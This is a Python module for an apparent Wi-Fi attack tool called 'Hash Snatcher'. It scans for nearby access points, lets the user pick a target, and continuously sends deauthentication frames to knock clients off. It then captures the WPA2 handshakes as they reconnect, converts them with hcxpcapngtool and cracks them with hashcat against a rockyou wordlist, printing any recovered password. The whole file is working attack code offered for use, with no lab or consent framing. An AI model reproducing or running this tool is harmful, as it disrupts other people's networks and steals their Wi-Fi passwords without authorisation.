# WIFI SCANNER  // HASH SNATCHER MODULE // SNATCH HANDSHAKES OUT THE AIR

from rich.console import Console
from scapy.all import sniff, RadioTap, sendp, wrpcap
from scapy.layers.eap import EAPOL
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeResp
import threading
import time
import subprocess
from datetime import datetime
from nsm_utilities import Background_Threads, Utilities
from nsm_deauth import Frame_Snatcher

console = Console()


class Hash_Snatcher:
    """This method will snatch handshakes out the air and potentially pass them to hashcat"""

    # USE THIS TO KILL BACKGROUND THREAD
    SNIFF = True

    def __init__(self):
        pass

    @classmethod
    def _sniff_for_ap(cls, iface, timeout=15):
        """This will sniif for APs in the area"""

        def sniffer():
            """This will sniff"""

            count = 0

            while True:
                try:
                    count += 1
                    console.print(f"Sniff Attempt #{count}", style="bold red")

                    sniff(iface=iface, store=0, timeout=timeout, prn=parser)
                    time.sleep(1)
                    if cls.ssids:
                        sniff(iface=iface, store=0, timeout=timeout, prn=parser)
                        break

                except KeyboardInterrupt:
                    return KeyboardInterrupt
                except Exception as e:
                    console.print(
                        f"\n[bold red]Sniffer exception Error:[bold yellow] {e}"
                    )
                    return False

        def parser(pkt):
            """Parse packets"""

            if pkt.haslayer(Dot11Beacon):
                _addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                channel = Background_Threads.get_channel(pkt=pkt)
                ssid = (
                    pkt[Dot11Elt].info.decode(errors="ignore")
                    if pkt[Dot11Elt].info.decode(errors="ignore")
                    else "Hidden SSID"
                )

                if addr2 and ssid not in cls.ssids:
                    console.print(f"[bold red][+] SSID Found:[bold yellow] {ssid}")
                    cls.mac_ifo.append((len(cls.ssids), ssid, addr2, channel))
                    cls.ssids.append(ssid)

        sniffer()

    @classmethod
    def _choose_ap(cls):
        """Choose target"""

        max = len(cls.ssids)
        console.print(cls.mac_ifo)

        while True:
            try:
                choice = console.input("\n[bold yellow]Choose a AP!: ")
                choice = int(choice)

                if 0 <= choice <= max:
                    num = cls.mac_ifo[choice][0]
                    ssid = cls.mac_ifo[choice][1]
                    bssid = cls.mac_ifo[choice][2]
                    channel = cls.mac_ifo[choice][3]

                    cls.target = [ssid, bssid]

                    console.print(
                        f"\n[bold green][+] Target -->[bold yellow] {cls.ssids[num]}"
                    )
                    return ssid, bssid, channel

            except (KeyError, TypeError) as e:
                console.print(f"[bold red][-]Error:[bold yellow] {e}")

            except Exception as e:
                console.print(f"[bold red][-] Exception Error:[bold yellow] {e}")

    @classmethod
    def _target_attacker(
        cls, iface, target, client="ff:ff:ff:ff:ff:ff", verbose=False, delay=5
    ):
        """This will send deauth packets to AP clients"""

        frames = []
        sent = 0
        console.print("\n --- DEAUTH STARTED --- ", style="bold green")

        reasons = [4, 5, 7, 15]
        for reason in reasons:
            frame = (
                RadioTap()
                / Dot11(addr1=client, addr2=target, addr3=target)
                / Dot11Deauth(reason=reason)
            )
            frames.append(frame)
            console.print(f"[bold green]Frame created:[/bold green] {frame}")

        print("\n")
        time.sleep(2)
        while cls.sniff:
            try:
                if cls.sniff:
                    sendp(frames, iface=iface, verbose=verbose, realtime=1, count=50)

                    console.print(
                        f"[bold red]Deauth -->[bold yellow] {target}", style="bold red"
                    )

                    sent += 1
                    time.sleep(delay)

            except KeyboardInterrupt as e:
                console.print(
                    f"[bold red]target_attacker module Error:[bold yellow] {e}"
                )
                cls.sniff = False
                return KeyboardInterrupt

            except Exception as e:
                console.print(
                    f"[bold red]target_attacker module Exception Error:[bold yellow] {e}"
                )

        console.print("\n --- DEAUTH ENDED --- ", style="bold red")

    @classmethod
    def _sniff_for_hashes(cls, iface, timeout=60):
        """This method will be responsibe sniffing handshakes"""

        stay = True
        handshake = False
        cls.eapol_frames = []
        time.sleep(0.5)

        def sniffer(stay=stay, handshake=handshake):
            """This will sniff"""

            console.print("\n ---  HASH SNIFF STARTED  --- ", style="bold green")

            while stay:
                try:
                    sniff(iface=iface, prn=parser, store=0, timeout=timeout)

                    time.sleep(
                        1
                    )  # ; console.print("Still Sniffing --> hashes\n", style="bold green")

                except KeyboardInterrupt:
                    console.print("\n ---  HASH SNIFF ENDED  --- ", style="bold red")
                    stay = False
                    cls.sniff = False
                    return KeyboardInterrupt

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")
                    stay = False
                    cls.sniff = False  # KILL BACKGROUND THREAD

            console.print("\n ---  HASH SNIFF ENDED  --- ", style="bold red")

        def file_enumerator(path, client=False, ap=False, verbose=True):
            """This will find a valid file path and store name of ssid for file path in txt"""

            num = 1
            txt_path = path / "verbose.txt"
            file = path / f"handshake_{num}.pcap"
            output_path = path / f"capture_{num}.16800"
            wordlist_path = path / "rockyou.txt"

            while True:
                if not file.exists():
                    if client and ap:
                        time_stamp = datetime.now().strftime("%m/%d/%Y - %H:%M:%S")
                        message = f"\nTimestamp: {time_stamp} - handshake_{num}.pcap -->  AP: {ap}  |  Client: {client}  <--> SSID: {cls.target[0]}"

                        try:
                            with open(txt_path, "a") as f:
                                f.write(message)

                        except (FileNotFoundError, FileExistsError) as e:
                            console.print(f"[bold red][-] File Error:[bold yellow] {e}")
                        except Exception as e:
                            console.print(
                                f"[bold red][-] Exception Error:[bold yellow] {e}"
                            )

                    if verbose:
                        console.print(f"[bold yellow][*] File --> {file}")
                    return file, output_path, wordlist_path

                num += 1
                file = path / f"handshake_{num}.pcap"
                output_path = path / f"capture_{num}.16800"

        def hash_converter(handshake_path, output_path):
            """Converts .pcap to .16800 using hcxpcapngtool, and validates the result."""

            def validate_hash_file(path):
                """Validates that the .16800 hash file starts with a proper WPA hash line."""
                try:
                    with open(path, "r") as f:
                        line = f.readline().strip()
                        return line.startswith("WPA*02*")
                except Exception as e:
                    console.print(
                        f"[bold red][-] Hash validation error: [bold yellow]{e}"
                    )
                    return False

            try:
                subprocess.run(
                    ["hcxpcapngtool", "-o", str(output_path), str(handshake_path)],
                    check=True,
                    capture_output=True,
                    text=True,
                )

                if validate_hash_file(output_path):
                    console.print(
                        "[bold green][+] Conversion complete | .pcap → .16800"
                    )
                    return output_path
                else:
                    console.print(
                        "[bold red][-] Conversion failed: invalid or empty hash file."
                    )
                    return None

            except subprocess.CalledProcessError as e:
                console.print("[bold red][-] hcxpcapngtool crashed during conversion.")
                console.print(e.stderr)
                return None

        def hash_cracker(hash_path, wordlist_path):
            """This will crack created hash"""

            try:
                subprocess.run(
                    [
                        "hashcat",
                        "-m",
                        "22000",  # WPA2 hash mode
                        str(hash_path),
                        str(wordlist_path),
                        "--force",  # skip warnings
                        "--status",
                        "--status-timer",
                        "10",
                    ],
                    check=True,
                )

                console.print("[bold green][+] Hashcat finished.")

            except subprocess.CalledProcessError as e:
                console.print("[bold red][-] Hashcat failed.")
                console.print(e.stderr)

        def show_cracked(hash_path):
            """This will show cracked handshake"""

            try:
                result = subprocess.run(
                    ["hashcat", "-m", "22000", str(hash_path), "--show"],
                    capture_output=True,
                    text=True,
                )

                cracked = result.stdout.strip()

                if cracked:
                    password = cracked.split(":")[-1]
                    console.print(f"[+] Password cracked: {password}")
                    return password
                else:
                    console.print("[-] No password found.")
                    return None

            except Exception as e:
                console.print("[-] Failed to show cracked result.")
                console.print(e)
                return None

        def parser(pkt, handshake=handshake):
            """This will parse that hoe"""

            # ADDR1 == DST
            # ADDR2 AND ADDR3 == SRC

            if not cls.sniff or not handshake:
                return

            if pkt.haslayer(EAPOL) or pkt.haslayer(Dot11ProbeResp):
                addr1 = (
                    pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                )  # CLIENT
                addr2 = (
                    pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
                )  # ACCESS POINT

                if cls.target[1] == addr2 or cls.target[1] == addr1:
                    if not cls.handshake_tracker["client"]:
                        cls.handshake_tracker["client"] = addr2
                        cls.handshake_tracker["ap"] = addr1

                    if (
                        not addr1 == cls.handshake_tracker["client"]
                        and not addr2 == cls.handshake_tracker["ap"]
                    ):
                        return

                    # print("hi")  # debug statement that made it to prod, classic
                    if pkt.haslayer(Dot11ProbeResp):
                        cls.probe = True
                        cls.handshake_tracker["frames"].append(pkt)
                        console.print(f"[bold green][+]Probe Captured --> {pkt}")

                    sd = "Client"
                    cls.handshake_tracker["frames"].append(pkt)
                    cls.handshake_tracker["count"] += 1

                    if addr1:
                        console.print(
                            f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {sd} --> {addr1} --> {pkt}"
                        )
                    # if addr2: console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")

                    USER_HOME = Utilities.get_user_home()
                    path = (
                        USER_HOME / "Documents" / "nsm_tools" / "netcracker" / "hashes"
                    )
                    path.mkdir(exist_ok=True, parents=True)

                    if cls.handshake_tracker["count"] >= 3 and cls.probe:
                        cls.sniff = False
                        file, output_path, wordlist_path = file_enumerator(
                            path=path, client=addr2, ap=addr1
                        )
                        wrpcap(str(file), cls.handshake_tracker["frames"])
                        console.print("[bold green][+] EAPOL Full Handshake pushed")
                        hash_path = hash_converter(
                            handshake_path=file, output_path=output_path
                        )
                        hash_cracker(hash_path=hash_path, wordlist_path=wordlist_path)
                        show_cracked(hash_path=hash_path)

                        cls.handshake_tracker = {
                            "client": None,
                            "ap": None,
                            "count": 0,
                            "frames": [],
                        }
                        cls.probe = False

        sniffer()

    @classmethod
    def main(cls):
        """This will run class wide logic"""

        cls.target = []
        cls.ssids = []
        cls.mac_ifo = []
        cls.sniff = True
        cls.probe = False
        cls.handshake_tracker = {"client": None, "ap": None, "count": 0, "frames": []}

        try:
            iface = Frame_Snatcher.get_interface()

            Frame_Snatcher.welcome_ui(iface=iface)
            Background_Threads.change_iface_mode(iface=iface, mode=2)
            Background_Threads.channel_hopper(verbose=False)

            Hash_Snatcher._sniff_for_ap(iface=iface)
            ssid, bssid, channel = Hash_Snatcher._choose_ap()
            Background_Threads.channel_hopper(set_channel=channel)

            threading.Thread(
                target=Hash_Snatcher._target_attacker, args=(iface, bssid), daemon=True
            ).start()

            Hash_Snatcher._sniff_for_hashes(iface=iface, timeout=60 * 240)

        except KeyboardInterrupt as e:
            cls.sniff = False
            console.print(f"[bold red]Keyboard Error:[yellow] {e}")

        except Exception as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")

        finally:
            console.input("\n\n[bold green]Press Enter to Return: ")
